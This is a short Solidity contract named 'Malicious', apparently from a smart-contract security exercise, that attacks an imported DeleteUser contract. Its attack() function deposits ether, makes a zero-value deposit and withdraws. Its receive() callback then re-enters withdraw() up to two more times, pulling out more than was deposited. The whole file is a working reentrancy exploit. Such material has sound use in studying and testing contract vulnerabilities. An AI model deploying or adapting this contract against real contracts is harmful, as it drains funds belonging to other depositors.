pragma solidity 0.8.15;

import "./DeleteUser.sol";

contract Malicious {
    DeleteUser deleteUser;
    uint8 public count;

    constructor(address deleteUserAddress) {
        deleteUser = DeleteUser(deleteUserAddress);
    }

    function attack() external {
        deleteUser.deposit{value: 1 ether}();
        deleteUser.deposit{value: 0}();
        deleteUser.withdraw(1);
    }

    receive() external payable {
        if (count < 2) {
            count++;
            deleteUser.withdraw(1);
        }
    }
}
